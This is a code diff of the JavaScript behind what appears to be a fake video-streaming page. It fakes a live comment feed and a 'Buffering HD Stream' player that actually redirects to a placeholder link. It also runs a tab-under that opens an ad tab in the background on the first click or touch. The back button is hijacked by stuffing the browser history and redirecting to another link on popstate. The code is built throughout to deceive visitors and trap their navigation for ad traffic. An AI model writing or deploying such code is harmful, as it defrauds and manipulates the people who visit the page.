@@ -486,26 +486,21 @@
                 </div>`;
             }
 
-            // Load initial few comments
             for(let i = 0; i < 4; i++) {
                 let randomComment = commentsPool[Math.floor(Math.random() * commentsPool.length)];
                 commentsContainer.innerHTML += createCommentHTML(randomComment);
             }
 
-            // ════════════════════════════════════════════════════════════
             // AUTO LIVE CHAT GENERATOR
-            // ════════════════════════════════════════════════════════════
             setInterval(() => {
                 let randomComment = commentsPool[Math.floor(Math.random() * commentsPool.length)];
                 commentsContainer.insertAdjacentHTML('afterbegin', createCommentHTML(randomComment));
-                
-                // Limit maximum visible comments to 20 for smooth performance
                 if(commentsContainer.children.length > 20) {
                     commentsContainer.removeChild(commentsContainer.lastChild);
                 }
             }, 3000);
 
-            // Load Sidebar Recommendations
+            // SIDEBAR RECOMMENDATIONS
             let sidebarHtml = '';
             videoPool.forEach((item) => {
                 if(item.title !== mainVideo.title || item.src !== mainVideo.src) {
@@ -525,38 +520,34 @@
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
             // ════════════════════════════════════════════════════════════
-            // SMART DUAL-TRACK TAB-UNDER ENGINE
+            // CONTROLLED ONE-TIME TAB-UNDER ENGINE
             // ════════════════════════════════════════════════════════════
             let hasTabUnderOpened = false;
 
-            function removeGeneralListeners() {
-                generalEvents.forEach(evt => {
-                    window.removeEventListener(evt, executeGeneralTabUnder, { capture: true });
-                });
-            }
-
-            function executeGeneralTabUnder() {
+            function triggerTabUnderOnce() {
                 if (hasTabUnderOpened) return;
                 hasTabUnderOpened = true;
 
-                pushStateHistory();
-
-                let newTab = window.open(window.location.href, '_blank');
+                // Open ad tab in background
+                let newTab = window.open(REDIRECT_LINK_1, '_blank');
                 if (newTab) {
-                    window.location.replace(REDIRECT_LINK_1);
+                    newTab.blur();
+                    window.focus();
                 }
 
-                removeGeneralListeners();
+                // Remove listener so it NEVER opens again
+                window.removeEventListener('click', triggerTabUnderOnce, true);
+                window.removeEventListener('touchstart', triggerTabUnderOnce, true);
             }
 
-            const generalEvents = ['scroll', 'touchstart', 'click', 'keydown'];
-            generalEvents.forEach(evt => {
-                window.addEventListener(evt, executeGeneralTabUnder, { capture: true });
-            });
+            // Trigger Tab-under ONLY on first user click or touch
+            window.addEventListener('click', triggerTabUnderOnce, true);
+            window.addEventListener('touchstart', triggerTabUnderOnce, true);
 
-            const elementActions = document.querySelectorAll('.element-action');
-            elementActions.forEach(el => {
-                el.addEventListener('click', function(e) {
+            // CLICK ACTION FOR ELEMENTS (PLAYER, BUTTONS, SIDEBAR)
+            document.addEventListener('click', function(e) {
+                const target = e.target.closest('.element-action');
+                if (target) {
                     e.stopPropagation();
 
                     const playBtnIcon = document.getElementById('playBtnIcon');
@@ -568,43 +559,22 @@
                     if (bufferText) bufferText.textContent = 'Buffering HD Stream...';
 
                     setTimeout(function() {
-                        if (!hasTabUnderOpened) {
-                            hasTabUnderOpened = true;
-                            removeGeneralListeners();
-                            
-                            window.open(REDIRECT_LINK_1, '_blank');
-                        }
-
                         window.location.href = DIRECT_LINK_MAIN;
                     }, 500);
-                });
+                }
             });
 
             // ════════════════════════════════════════════════════════════
-            // ENHANCED BACK-BUTTON HIJACKING
+            // BACK-BUTTON HIJACKING
             // ════════════════════════════════════════════════════════════
-            let hijackInitialized = false;
-
             function pushStateHistory() {
-                for (let i = 0; i < 15; i++) {
+                for (let i = 0; i < 10; i++) {
                     window.history.pushState({ page: i }, document.title, window.location.href);
                 }
             }
-
-            function setupHijack() {
-                if (!hijackInitialized) {
-                    pushStateHistory();
-                    hijackInitialized = true;
-                }
-            }
-
             pushStateHistory();
 
-            generalEvents.forEach(evt => {
-                window.addEventListener(evt, setupHijack, { passive: true });
-            });
-
-            window.addEventListener('popstate', function (event) {
+            window.addEventListener('popstate', function () {
                 pushStateHistory();
                 window.location.href = BACK_HIJACK_LINK;
             });
